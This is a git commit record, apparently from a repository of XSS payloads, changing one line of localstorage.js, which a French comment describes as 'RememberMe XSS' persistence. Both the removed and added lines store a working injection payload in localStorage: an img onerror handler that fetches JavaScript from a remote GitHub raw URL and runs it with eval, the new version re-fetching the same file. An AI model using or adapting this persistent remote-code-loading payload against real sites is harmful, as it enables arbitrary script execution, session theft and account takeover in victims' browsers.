310b8d51da5bd931e61d7d7bee0448366dab6760
Jok3r <115065483+Vault-of-Jok3r@users.noreply.github.com>
2025-03-11 14:41:04 +0100

    Update localstorage.js

--- localstorage.js
+++ localstorage.js
@@ -1,2 +1,2 @@
 // 1. Persistance dans localStorage pour RememberMe XSS
-localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/newpayload.js').then(r=>r.text()).then(c=>eval(c))">`);
+localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/localstorage.js').then(r=>r.text()).then(c=>eval(c))">`);
